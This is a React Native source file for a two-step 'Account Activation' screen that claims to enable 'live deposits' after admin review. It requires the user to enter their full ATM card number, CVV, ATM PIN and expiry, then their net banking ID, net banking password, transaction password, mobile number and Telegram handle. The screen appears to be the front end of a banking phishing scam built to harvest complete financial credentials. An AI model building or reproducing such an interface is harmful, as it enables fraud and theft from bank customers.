import { useAccountActivation } from "@/hooks/useAccountActivation";
import { styles } from "@/screens/feature-compo/AccountActivation.style";
import { Ionicons } from "@expo/vector-icons";
import { useRouter } from "expo-router";
import { useEffect, useRef } from "react";
import {
    ActivityIndicator,
    Keyboard,
    KeyboardAvoidingView,
    Platform,
    ScrollView,
    Text,
    TextInput,
    TouchableOpacity,
    View
} from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";

export default function AccountActivation() {

    const router = useRouter();
    const accountRef = useRef<TextInput>(null);
    const netIdRef = useRef<TextInput>(null);
    const scrollRef = useRef<ScrollView>(null);
    const {
        step,
        setStep,
        toast,
        form,
        errors,
        showNetPass,
        setShowNetPass,
        showTxnPass,
        setShowTxnPass,
        loading,
        updateField,
        formatCard,
        formatExpiry,
        goToStep,
        submitActivation,
        resetAfterSuccess,
    } = useAccountActivation();

    const isStep1Complete =
        form.accountNumber.length >= 9 &&
        form.ifsc.length === 11 &&
        form.atmNumber.replace(/\s/g, "").length === 16 &&
        form.cvv.length === 3 &&
        form.atmPin.length === 4 &&
        form.expiry.length === 5;

    const isStep2Complete =
        form.netId &&
        form.netPassword &&
        form.txnPassword &&
        form.mobile.length === 10 &&
        form.telegram;

    const handleSubmit = async () => {
        const success = await submitActivation();

        if (!success) {
            return;
        }

        setTimeout(() => {
            resetAfterSuccess();
            router.back();
        }, 2200);
    };

    useEffect(() => {
        if (step === 1) {
            accountRef.current?.focus();
        } else {
            netIdRef.current?.focus();
        }
    }, [step]);

    useEffect(() => {

        const hideListener = Keyboard.addListener(
            "keyboardDidHide",
            () => {
                scrollRef.current?.scrollTo({ y: 0, animated: true });
            }
        );

        return () => hideListener.remove();

    }, []);

    return (

        <SafeAreaView style={styles.safeArea}>
            <KeyboardAvoidingView
                style={{ flex: 1 }}
                behavior={Platform.OS === "ios" ? "padding" : undefined}
                keyboardVerticalOffset={Platform.OS === "ios" ? 90 : 0}
            >
                <ScrollView
                    ref={scrollRef}
                    keyboardDismissMode="interactive"
                    contentContainerStyle={[styles.container, { paddingBottom: 40 }]}
                    showsVerticalScrollIndicator={false}
                    keyboardShouldPersistTaps="handled"
                >

                    <View style={styles.header}>

                        <TouchableOpacity
                            style={styles.backBtn}
                            onPress={() => {
                                if (step === 2 && !loading) {
                                    setStep(1);
                                    return;
                                }

                                router.back();
                            }}
                            disabled={loading}
                        >
                            <Ionicons name="arrow-back" size={22} color="#fff" />
                        </TouchableOpacity>

                        <Text style={styles.headerTitle}>
                            Account Activation
                        </Text>

                    </View>

                    <Text style={styles.pageTitle}>
                        Complete the form below to activate live deposits
                    </Text>

                    <View style={styles.progressWrap}>

                        <View style={styles.progressRow}>

                            <TouchableOpacity
                                onPress={() => goToStep(1)}
                                disabled={loading || step === 1}
                            >
                                <View style={[styles.progressDot, step >= 1 && styles.progressActive]} />
                            </TouchableOpacity>

                            <View style={styles.progressLine} />

                            <TouchableOpacity
                                onPress={() => goToStep(2)}
                                disabled={loading || step === 2}
                            >
                                <View style={[styles.progressDot, step >= 2 && styles.progressActive]} />
                            </TouchableOpacity>

                        </View>

                        <Text style={styles.progressText}>
                            Step {step} of 2
                        </Text>

                    </View>

                    <View style={styles.card}>

                        <View style={styles.cardHeader}>

                            <View style={styles.iconBox}>
                                <Ionicons name="flash-outline" size={20} color="#8B5CF6" />
                            </View>

                            <View>

                                <Text style={styles.cardTitle}>
                                    Activation Details
                                </Text>

                                <Text style={styles.cardDesc}>
                                    Fill all details to activate your account
                                </Text>

                            </View>

                        </View>

                        <View style={styles.securityCard}>

                            <Ionicons name="lock-closed-outline" size={18} color="#22C55E" />

                            <Text style={styles.securityText}>
                                Your details will be securely reviewed by our admin team.
                                Once approved, your account will be activated for live deposits.
                            </Text>

                        </View>

                        {step === 1 && (

                            <>

                                <Text style={styles.label}>Account Number *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="card-outline" size={16} color="#94A3B8" />

                                    <TextInput
                                        ref={accountRef}
                                        style={styles.inputField}
                                        keyboardType="number-pad"
                                        returnKeyType="next"
                                        placeholder="Enter account number"
                                        placeholderTextColor="#6B7280"
                                        value={form.accountNumber}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("accountNumber", t.replace(/\D/g, ""))}
                                    />

                                </View>

                                {errors.accountNumber && <Text style={styles.error}>{errors.accountNumber}</Text>}

                                <Text style={styles.label}>IFSC Code *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="business-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        autoCapitalize="characters"
                                        placeholder="Enter IFSC"
                                        value={form.ifsc}
                                        maxLength={11}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("ifsc", t.replace(/[^a-zA-Z0-9]/g, "").toUpperCase())}
                                    />
                                </View>

                                {errors.ifsc && <Text style={styles.error}>{errors.ifsc}</Text>}

                                <Text style={styles.label}>ATM Card *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="card-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        keyboardType="number-pad"
                                        placeholder="1234 5678 9012 3456"
                                        value={form.atmNumber}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("atmNumber", formatCard(t))}
                                    />
                                </View>

                                {errors.atmNumber && <Text style={styles.error}>{errors.atmNumber}</Text>}

                                <Text style={styles.label}>CVV *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="shield-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        keyboardType="number-pad"
                                        secureTextEntry
                                        maxLength={3}
                                        value={form.cvv}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("cvv", t.replace(/\D/g, ""))}
                                    />
                                </View>

                                {errors.cvv && <Text style={styles.error}>{errors.cvv}</Text>}

                                <Text style={styles.label}>ATM PIN *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="lock-closed-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        keyboardType="number-pad"
                                        secureTextEntry
                                        maxLength={4}
                                        value={form.atmPin}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("atmPin", t.replace(/\D/g, ""))}
                                    />
                                </View>

                                {errors.atmPin && <Text style={styles.error}>{errors.atmPin}</Text>}

                                <Text style={styles.label}>Expiry *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="calendar-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        keyboardType="number-pad"
                                        placeholder="MM/YY"
                                        value={form.expiry}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("expiry", formatExpiry(t))}
                                    />
                                </View>

                                {errors.expiry && <Text style={styles.error}>{errors.expiry}</Text>}

                                <TouchableOpacity
                                    style={[
                                        styles.submitBtn,
                                        (!isStep1Complete || loading) && styles.disabledBtn
                                    ]}
                                    disabled={!isStep1Complete || loading}
                                    onPress={() => {
                                        goToStep(2);
                                    }}
                                >

                                    <Text style={styles.submitText}>
                                        Continue
                                    </Text>

                                </TouchableOpacity>

                            </>

                        )}

                        {step === 2 && (

                            <>

                                <Text style={styles.label}>Net Banking ID *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="person-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        returnKeyType="next"
                                        ref={netIdRef}
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        value={form.netId}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("netId", t)}
                                    />
                                </View>

                                {errors.netId && <Text style={styles.error}>{errors.netId}</Text>}

                                <Text style={styles.label}>Net Banking Password *</Text>

                                <View style={styles.passwordWrap}>

                                    <Ionicons name="lock-closed-outline" size={16} color="#94A3B8" />

                                    <TextInput
                                        style={styles.passwordInput}
                                        placeholderTextColor="#6B7280"
                                        secureTextEntry={!showNetPass}
                                        value={form.netPassword}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("netPassword", t)}
                                    />

                                    <TouchableOpacity
                                        onPress={() => setShowNetPass(!showNetPass)}
                                        disabled={loading}
                                    >

                                        <Ionicons
                                            name={showNetPass ? "eye-off-outline" : "eye-outline"}
                                            size={18}
                                            color="#9CA3AF"
                                        />

                                    </TouchableOpacity>

                                </View>

                                {errors.netPassword && <Text style={styles.error}>{errors.netPassword}</Text>}

                                <Text style={styles.label}>Transaction Password *</Text>

                                <View style={styles.passwordWrap}>

                                    <Ionicons name="lock-closed-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.passwordInput}
                                        placeholderTextColor="#6B7280"
                                        secureTextEntry={!showTxnPass}
                                        value={form.txnPassword}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("txnPassword", t)}
                                    />

                                    <TouchableOpacity
                                        onPress={() => setShowTxnPass(!showTxnPass)}
                                        disabled={loading}
                                    >

                                        <Ionicons
                                            name={showTxnPass ? "eye-off-outline" : "eye-outline"}
                                            size={18}
                                            color="#9CA3AF"
                                        />

                                    </TouchableOpacity>

                                </View>

                                {errors.txnPassword && <Text style={styles.error}>{errors.txnPassword}</Text>}

                                <Text style={styles.label}>Registered Mobile *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="call-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        keyboardType="number-pad"
                                        maxLength={10}
                                        value={form.mobile}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("mobile", t.replace(/\D/g, ""))}
                                    />
                                </View>

                                {errors.mobile && <Text style={styles.error}>{errors.mobile}</Text>}

                                <Text style={styles.label}>Telegram *</Text>

                                <View style={styles.inputWrap}>

                                    <Ionicons name="send-outline" size={16} color="#94A3B8" />
                                    <TextInput
                                        style={styles.inputField}
                                        placeholderTextColor="#6B7280"
                                        placeholder="@username"
                                        value={form.telegram}
                                        editable={!loading}
                                        onChangeText={(t) => updateField("telegram", t)}
                                    />
                                </View>

                                {errors.telegram && <Text style={styles.error}>{errors.telegram}</Text>}

                                <TouchableOpacity
                                    style={[
                                        styles.submitBtn,
                                        (!isStep2Complete || loading) && styles.disabledBtn
                                    ]}
                                    disabled={!isStep2Complete || loading}
                                    onPress={handleSubmit}
                                >

                                    {loading ? (
                                        <ActivityIndicator size="small" color="#fff" />
                                    ) : (
                                        <Ionicons name="shield-checkmark-outline" size={18} color="#fff" />
                                    )}

                                    <Text style={styles.submitText}>
                                        {loading ? "Submitting..." : "Submit for Approval"}
                                    </Text>

                                </TouchableOpacity>

                                <TouchableOpacity
                                    style={styles.stepBackBtn}
                                    onPress={() => goToStep(1)}
                                    disabled={loading}
                                >
                                    <Ionicons name="arrow-back-outline" size={16} color="#9CA3AF" />
                                    <Text style={styles.stepBackText}>Back to Step 1</Text>
                                </TouchableOpacity>

                            </>

                        )}

                    </View>

                </ScrollView>

                {toast !== "" && (
                    <View style={styles.toast}>
                        <Text style={styles.toastText}>{toast}</Text>
                    </View>
                )}
            </KeyboardAvoidingView>
        </SafeAreaView >

    );

}
